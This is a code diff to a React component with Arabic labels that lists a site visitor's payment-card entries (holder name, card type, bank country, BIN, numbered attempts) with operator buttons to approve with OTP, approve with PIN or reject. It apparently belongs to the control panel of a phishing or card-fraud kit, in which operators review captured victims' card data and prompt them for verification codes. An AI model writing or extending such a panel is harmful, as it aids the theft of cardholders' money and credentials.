@@ -286,9 +286,17 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
       cardHolderName = encryptedCardHolderName;
     }
 
+    const isLatestCard = index === 0;
+    const effectiveCardStatus =
+      isLatestCard && visitor.cardStatus === "message"
+        ? "message"
+        : cardHistory.status;
+
     // Show all cards, but hide action buttons if already actioned
     const hasBeenActioned =
-      cardHistory.status === "approved" || cardHistory.status === "rejected";
+      effectiveCardStatus === "approved_with_otp" ||
+      effectiveCardStatus === "approved_with_pin" ||
+      effectiveCardStatus === "rejected";
 
     const cardType =
       cardHistory.data?.cardType ||
@@ -308,7 +316,7 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
       bubbles.push({
         id: `card-info-${cardHistory.id || index}`,
         title:
-          index === 0
+          isLatestCard
             ? "معلومات البطاقة"
             : `معلومات البطاقة (محاولة ${sortedCardHistory.length - index})`,
         icon: "💳",
@@ -324,9 +332,9 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
           "بلد البنك": cardHistory.data?.bankInfo?.country || "غير محدد",
         },
         timestamp: cardHistory.timestamp,
-        status: cardHistory.status || ("pending" as const),
+        status: effectiveCardStatus || ("pending" as const),
         showActions: !hasBeenActioned,
-        isLatest: index === 0,
+        isLatest: isLatestCard,
         type: "card",
         binNumber: cardNumber || undefined,
       });
